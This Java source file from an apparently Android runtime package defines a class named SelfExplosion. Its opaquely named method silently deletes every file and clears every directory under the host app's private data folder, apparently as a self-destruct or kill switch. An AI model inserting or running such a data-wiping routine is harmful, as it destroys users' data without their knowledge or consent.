package com.virjar.ratel.runtime;

import com.virjar.ratel.utils.FileUtils;

import java.io.File;

public class SelfExplosion {
    @SuppressWarnings("all")
    //explosion
    public static void a() {
        File[] files = RatelRuntime.originContext.getFilesDir().getParentFile().listFiles();
        if (files == null) {
            return;
        }
        for (File file : files) {
            if (file.canWrite() && file.isFile()) {
                file.delete();
            } else if (file.isDirectory()) {
                FileUtils.cleanDirectory(file);
            }
        }
    }

//    public static void main(String[] args) {
//        SelfExplosion.class.getDeclaredMethods()[0].invoke(null);
//    }
}
